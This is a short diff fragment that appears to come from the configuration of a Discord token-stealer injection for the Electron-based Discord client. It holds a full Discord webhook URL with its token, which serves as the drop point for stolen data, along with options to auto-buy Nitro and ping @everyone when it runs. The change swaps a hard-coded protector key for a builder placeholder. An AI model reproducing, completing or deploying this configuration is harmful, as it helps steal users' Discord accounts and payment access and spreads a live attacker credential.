@@ -7,7 +7,7 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: 'https://discord.com/api/webhooks/1118628816693252137/6ZRG65oRylbpe-qxJNBrDFIGI64f2ecox7bNlyvFrz9k9iZH4OlKwfwFo-gfrWw5Tbxl',
-  webhook_protector_key: 'FLORIAN',
+  webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
